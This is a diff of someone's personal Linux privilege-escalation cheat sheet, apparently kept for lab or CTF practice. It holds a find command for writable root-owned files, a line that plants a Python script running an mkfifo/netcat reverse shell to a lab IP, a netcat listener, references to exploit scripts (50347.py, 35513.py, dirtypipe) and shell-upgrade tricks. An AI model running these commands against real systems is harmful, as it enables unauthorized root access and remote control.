@@ -97,6 +97,9 @@
         uname,kernel, process, cron, writable file or dirc, SUID, home, env, sudo -s, getcap
         $uname -a    i686 means a 32bit OS, use gcc to create a 32bit file 
 
+
+
+        1> root priv file
         $find / -type f -user root -perm -o=w 2>/dev/null | grep -v 'proc\|sys'
 
             
@@ -110,11 +113,22 @@
                 os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.0.234 4444 > /tmp/f')
             except:
                 sys.exit()" > /opt/tmp.py
+            $ nc -nv 4444 # on the host
+            #when tmp.py will be run, a reverse shell will be sent
 
+            2> pretty exploit
+                50347.py will create a fully root shell 
+            
+            3> not well exploit
+                35513.py
 
-            #to get a full tty
-                on the condition of a better python shell,ctrl+z, stty raw -echo, fg, export SHELL=/bin/bash
-                # the $ export TERM=srcreen, stty rows xx columns xx, reset
+            #may need to get a full tty
+                #on the condition of a better python shell,
+                #on the host shell  $bash   $stty -a # to get the row and columns of current shell
+
+             *   #then ssh to the target    needto be checked
+             *   ctrl+z, stty raw -echo, fg, export SHELL=/bin/bash
+             *   # the $ export TERM=srcreen, stty rows xx columns xx, reset
             dirtypipe
 
 
